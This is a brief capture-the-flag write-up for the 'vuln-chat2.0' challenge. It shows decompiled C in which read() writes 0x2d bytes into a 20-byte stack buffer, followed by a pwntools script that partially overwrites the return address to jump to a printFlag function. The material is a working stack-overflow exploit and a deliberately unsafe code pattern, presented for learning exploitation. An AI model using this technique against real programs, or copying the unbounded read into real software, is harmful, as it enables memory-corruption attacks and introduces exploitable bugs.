# Vulnchat 2  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/f731f04f-2fca-446a-a740-a682510119bd)

There's not much to say here, look at [pwn2](7.PartialOverwrite/tamu19_pwn2.md) for more details on this kind of challenge.  

```c 
void doThings(void)

{
  undefined buf [20];
  undefined user [15];
  
  puts("----------- Welcome to vuln-chat2.0 -------------");
  printf("Enter your username: ");
  __isoc99_scanf(&%15s,user);
  printf("Welcome %s!\n",user);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: You\'ve proven yourself to me. What information do you need?");
  printf("%s: ",user);
  read(0,buf,0x2d);
  puts("djinn: Alright here\'s you flag:");
  puts("djinn: flag{1_l0v3_l337_73x7}");
  puts("djinn: Wait thats not right...");
  return;
}
```

Again, we can partially overwrite the return address to return to a `printFlag` function.  

```python
from pwn import *

exe = context.binary = ELF(args.EXE or 'vuln-chat2.0')
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

io.sendline("UserName")

payload = 0x2b*b'A' + (exe.sym["printFlag"] & 0xffff).to_bytes(2,'little')
io.sendline(payload)

io.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/2055b120-e4b3-4194-a800-c43f0cea5ba5)
